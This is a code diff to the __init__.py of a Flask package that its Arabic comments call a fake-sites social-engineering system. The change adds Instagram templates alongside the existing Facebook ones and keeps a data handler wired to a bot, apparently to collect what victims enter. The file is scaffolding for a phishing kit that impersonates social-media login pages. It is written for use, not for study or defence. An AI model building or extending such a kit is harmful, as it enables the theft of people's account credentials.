@@ -1,6 +1,7 @@
 # fake_sites/__init__.py
 # ============================================================
 # نظام المواقع المزيفة — الهندسة الاجتماعية
+# v2 — مع Instagram
 # ============================================================
 
 from flask import Blueprint
@@ -9,7 +10,6 @@ from logging_config import get_logger
 
 logger = get_logger("fake_sites")
 
-# Blueprint رئيسي
 fake_sites_bp = Blueprint(
     'fake_sites',
     __name__,
@@ -17,23 +17,28 @@ fake_sites_bp = Blueprint(
 )
 
 
-# ============================================================
-# Init
-# ============================================================
 def init_fake_sites(app, bot):
     """تسجيل كل الأقسام"""
     from .data_handler import init_data_handler
 
-    # سجل معالج البيانات (يجيب من كل الأقسام)
+    # سجل معالج البيانات
     init_data_handler(app, bot)
 
-    # سجل الأقسام
+    # سجل Facebook
     try:
         from .facebook import init_facebook_templates
         init_facebook_templates(app)
         logger.info("[+] Facebook templates registered")
     except Exception as e:
         logger.exception(f"[-] Facebook templates error: {e}")
+
+    # ★ سجل Instagram
+    try:
+        from .instagram import init_instagram_templates
+        init_instagram_templates(app)
+        logger.info("[+] Instagram templates registered")
+    except Exception as e:
+        logger.exception(f"[-] Instagram templates error: {e}")
 
     logger.info("[+] Fake Sites system initialized")
 
